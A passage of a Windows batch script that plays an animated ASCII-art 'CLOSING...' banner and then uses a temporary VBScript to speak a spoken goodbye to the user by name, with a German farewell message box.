echo       ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::                     
echo     :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:                     
echo    +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                             
echo   +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                              
echo  +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#                        
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#         #+# #+# #+#     
echo ########  ########## ########   ######## ########### ###    ####  ########          ### ### ###  
timeout 1 >NUL
cls

echo       ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::             
echo     :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:             
echo    +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                     
echo   +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                      
echo  +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#                
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#         #+#     
echo ########  ########## ########   ######## ########### ###    ####  ########          ###  
timeout 1 >NUL
cls

echo set speechobject=createobject("sapi.spvoice") >%userprofile%\AppData\Local\Temp\welcome.vbs
echo dim speechobject >>%userprofile%\AppData\Local\Temp\welcome.vbs
echo speechobject.speak "Goodbye %username%" >>%userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
start %userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
del %userprofile%\AppData\Local\Temp\welcome.vbs
msg * Man sieht sich.
goto exit

:Goodbye2
cls
title Bis Bald %username%
Color A
echo  ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::           
echo :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:          
echo +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                 
echo +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                 
echo +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#          
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#      #+# 
echo  ########  ########## ########   ######## ########### ###    ####  ########       ###
timeout 1 > NUL
cls

echo  ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::           
echo :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:          
echo +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                 
echo +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                 
echo +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#          
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#      #+# #+#
echo  ########  ########## ########   ######## ########### ###    ####  ########       ### ###
timeout 1 > NUL
cls

echo  ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::           
echo :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:          
echo +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                 
echo +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                 
echo +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#          
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#      #+# #+# #+#
echo  ########  ########## ########   ######## ########### ###    ####  ########       ### ### ###
timeout 1 > NUL
cls

echo  ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::           
echo :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:          
echo +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                 
echo +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                 
echo +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#          
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#      #+# 
echo  ########  ########## ########   ######## ########### ###    ####  ########       ###
timeout 1 >NUL
cls

echo set speechobject=createobject("sapi.spvoice") >%userprofile%\AppData\Local\Temp\welcome.vbs
echo dim speechobject >>%userprofile%\AppData\Local\Temp\welcome.vbs
echo speechobject.speak "Goodbye %username%" >>%userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
start %userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
del %userprofile%\AppData\Local\Temp\welcome.vbs
msg * Man sieht sich.
goto exit
